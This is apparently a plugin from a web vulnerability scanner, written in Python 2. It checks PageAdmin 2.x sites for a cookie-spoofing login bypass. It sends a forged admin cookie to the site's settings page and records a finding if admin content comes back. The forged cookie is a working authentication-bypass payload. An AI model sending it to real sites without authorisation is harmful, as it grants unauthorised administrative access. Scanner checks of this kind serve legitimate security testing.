#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "master/set_1.aspx"
        headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5","Cookie": "Master=1&LoginProcess=1&UserName=admin&LOginDate=1&Valicate=12b36e45c2df117d12a068814d826283f9c32f845e1589142208628b13f&Permissions=1"}
        #res, content = http.request(url,'GET',headers=headers)
        res, content = yx_httplib2_request(http,url,'GET',headers=headers)
        if res['status'] == '200' and content.find('pageadmin@sohu.com')>=0 and content.find('smtp.sohu.com')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:PageAdmin_2x_CookieSpoofingScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:PageAdmin_2x_CookieSpoofingScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
